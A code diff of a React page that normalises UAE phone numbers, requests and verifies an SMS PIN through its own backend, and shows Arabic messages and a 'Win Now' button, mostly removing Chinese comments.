@@ -18,26 +18,21 @@ export default function Home() {
   // 呼叫后台获取 PIN
   const handleRequestPin = async () => {
     if (!msisdn) {
-      setMessage('يرجى إدخال رقم الهاتف'); // 请输入手机号
+      setMessage('يرجى إدخال رقم الهاتف'); 
       return;
     }
     
     setLoading(true);
-    setMessage('جاري التحقق...'); // 👈 完美！去掉了多余的英文 (Verifying...)
+    setMessage('جاري التحقق...');
 
-    // ================= 【智能清洗核心逻辑】 =================
+    // 号码智能清洗
     let cleanMsisdn = msisdn.trim();
-    
-    // 1. 如果用户输入带 0 开头 (如 0541234567)，强行把开头的 0 去掉
     if (cleanMsisdn.startsWith('0')) {
       cleanMsisdn = cleanMsisdn.substring(1);
     }
-    
-    // 2. 自动补齐 971 国家代码
     if (!cleanMsisdn.startsWith('971')) {
       cleanMsisdn = '971' + cleanMsisdn;
     }
-    // =======================================================
     
     try {
       const res = await fetch('/api/request', {
@@ -49,9 +44,8 @@ export default function Home() {
       if (res.success) {
         setTxid(res.txid);
         setStep(2);
-        setMessage(''); // 清空提示
+        setMessage(''); 
       } else {
-        // 隐藏技术错误，统一显示官方提示
         setMessage('❌ عذراً، هذا الرقم غير مؤهل حالياً. يرجى التأكد من أنه رقم اتصالات فعال.');
       }
     } catch (err) {
@@ -81,7 +75,7 @@ export default function Home() {
         setStep(3);
         setMessage('');
       } else {
-        setMessage('❌ الرمز غير صحيح، حاول مرة أخرى'); // PIN码错误
+        setMessage('❌ الرمز غير صحيح، حاول مرة أخرى');
       }
     } catch (err) {
       setMessage('❌ حدث خطأ في الاتصال، يرجى المحاولة لاحقاً');
@@ -114,6 +108,7 @@ export default function Home() {
               onChange={(e) => setMsisdn(e.target.value.replace(/\D/g, ''))}
               style={{ width: '90%', padding: '15px', marginBottom: '20px', border: '2px solid #444', borderRadius: '8px', fontSize: '18px', textAlign: 'center', backgroundColor: '#333', color: '#fff', outline: 'none', direction: 'ltr' }}
             />
+            {/* 🔥 这里已经彻底硬编码成纯阿拉伯语的 "Win Now (اربح الآن)" */}
             <button 
               onClick={handleRequestPin} 
               disabled={loading}
